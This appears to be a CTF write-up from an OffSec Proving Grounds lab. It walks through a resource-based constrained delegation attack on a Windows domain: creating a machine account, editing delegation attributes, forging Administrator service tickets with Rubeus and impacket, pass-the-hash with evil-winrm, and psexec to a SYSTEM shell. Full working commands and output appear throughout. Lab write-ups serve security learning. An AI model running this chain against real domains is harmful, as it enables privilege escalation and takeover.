# Resource-Based Constrained Delegation Attack

Following Bloodhound's guide for Windows Abuse, I'll download Powermad.ps1, upload to the target, and create a new system account.
https://github.com/Kevin-Robertson/Powermad
```
upload scripts/Powermad.ps1
. .\Powermad.ps1
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
```

(I had to modify this slightly, as the command written in bloodhound wasn't parsing the Get-DomainComputer output correctly, so it looked like the account wasn't created).
*Upload Powerview.ps1*
```
upload scripts/powerview.ps1
. .\powerview.ps1
$ComputerSid = Get-DomainComputer attackersystem -Properties * | Select -Expand objectsid

// echo $ComputerSid prints S-1-5-21-537427935-490066102-1511301751-4101
```

```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

```
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

*Upload Rubeus*
`.\Rubeus.exe hash /password:Summer2018!`

![[Pasted image 20250816082114.png]]

```
.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:cifs/ResourceDC.resourced.local /ptt
```

![[Pasted image 20250816082609.png]]

Now, running klist we see that we have the Administrator's ticket cached:

![[Pasted image 20250816083127.png]]

However, I'd like a fully interactive shell as administrator... it turns out this is easier when done from Linux, like many things. 

At this point I also lost my network connection to the target and was unable to even ping, so I reset it. Starting with a fresh system take a slightly different approach to use Linux at the end to gain a shell as Administrator.

Connect via WinRM pass the hash:
`evil-winrm -i ResourceDC.resourced.local -u 'L.Livingstone' -H '19a3a7550ce8c505c2d46b5e39d6f808'`

Repeat steps from above to add a service account, stopping at Rubeus.

Then, from kali:

Get NTLM hash, confirm it matches from earlier:

`echo -n 'Summer2018!' | iconv -t utf16le | openssl md4`

```
MD4(stdin)= ef266c6b963c0bb683941032008ad47f
```

Save service ticket as ccache file:
`impacket-getST resourced.local/attackersystem\$ -hashes :ef266c6b963c0bb683941032008ad47f -spn cifs/ResourceDC.resourced.local -impersonate Administrator -dc-ip 192.168.139.175`

```
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_ResourceDC.resourced.local@RESOURCED.LOCAL.ccache
```

```
export KRB5CCNAME=Administrator@cifs_ResourceDC.resourced.local@RESOURCED.LOCAL.ccache

impacket-psexec -k -no-pass resourced.local/Administrator@ResourceDC.resourced.local
```

![[Pasted image 20250816090605.png]]

Finally !!!

I'll upload SauronEye.exe from my evil-winrm session and run as System to find flags across the whole system:

![[Pasted image 20250816090934.png]]

We have C:\Users\L.Livingstone\Desktop\local.txt and C:\Users\Administrator\Desktop\proof.txt.

# The End: [[Archive/OFFSEC - Proving Grounds Writeups/Windows/Resourced/index|index]]